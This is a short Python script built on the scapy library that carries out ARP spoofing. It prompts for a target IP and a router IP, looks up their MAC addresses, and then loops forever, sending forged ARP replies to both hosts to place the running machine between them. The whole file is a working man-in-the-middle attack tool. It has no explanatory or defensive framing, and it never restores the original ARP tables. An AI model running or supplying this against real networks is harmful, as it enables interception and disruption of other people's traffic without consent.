#!/usr/bin/env python 3
import time

import scapy.all as scapy

ip = input("enter target ip: ")
router_ip = input("router IP: ")
program = True
packet_count = 0


def scan(ip):
    """Scan Network For Connected Devices"""
    arp_request = scapy.ARP(pdst=ip)
    broadcast = scapy.Ether(dst="ff:ff:ff:ff:ff:ff")
    arp_request_broadcast = broadcast / arp_request
    answered_list = scapy.srp(arp_request_broadcast, timeout=1, verbose=False)[0]
    return answered_list[0][1].hwsrc


def create_packet(target_ip, spoof_ip):
    MAC = scan(target_ip)
    packet = scapy.ARP(op=2, pdst=target_ip, hwdst=MAC, psrc=spoof_ip)
    scapy.send(packet)


while program:
    packet_count +=2
    create_packet(ip, router_ip)
    create_packet(router_ip, ip)
    time.sleep(2)
    print(f"packets sent: {packet_count}")